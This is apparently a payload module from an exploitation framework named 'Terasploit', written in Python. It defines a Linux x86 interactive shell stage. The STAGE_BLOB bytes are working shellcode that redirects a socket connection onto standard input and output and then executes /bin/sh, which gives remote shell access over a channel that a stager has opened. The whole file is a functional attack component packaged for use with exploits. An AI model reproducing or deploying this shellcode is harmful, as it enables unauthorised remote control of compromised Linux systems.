"""
Terasploit Framework (c) 2026

Author:          4steroth
License:         BSD-3-Clause
Path:            modules/payload/stages/linux/x86/shell.py
"""

from teralibs.tsf.base.payload import ARCH_X86, PLATFORM_LINUX, STAGE, Payload


class TerasploitModule(Payload):
    """Linux x86 interactive shell stage."""

    NAME = "Linux x86 Shell Stage"
    DESCRIPTION = (
        "Full interactive /bin/sh stage for Linux IA-32.  Delivered "
        "automatically over the channel opened by a compatible x86 stager. "
        "Not used directly by exploit modules."
    )
    AUTHOR = "4steroth"
    LICENSE = "BSD-3-CLAUSE"
    VERSION = "1.0"
    RANK = "normal"
    REFERENCES = []

    PAYLOAD_TYPE = STAGE

    MAX_SIZE = 1024 * 1024  # 1 MiB

    ARCH = [ARCH_X86]
    PLATFORM = [PLATFORM_LINUX]

    OPTIONS = []

    STAGE_BLOB = (
        b"\x89\xfb\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x6a\x0b\x58"
        b"\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
        b"\x89\xe1\xcd\x80"
    )

    def generate(self, ctx):
        """Generate method is not really implemented in stage payloads."""
        return b""

    def generate_stage(self, ctx):
        """
        Return the Linux x86 shell stage bytes.
        """
        return self.STAGE_BLOB
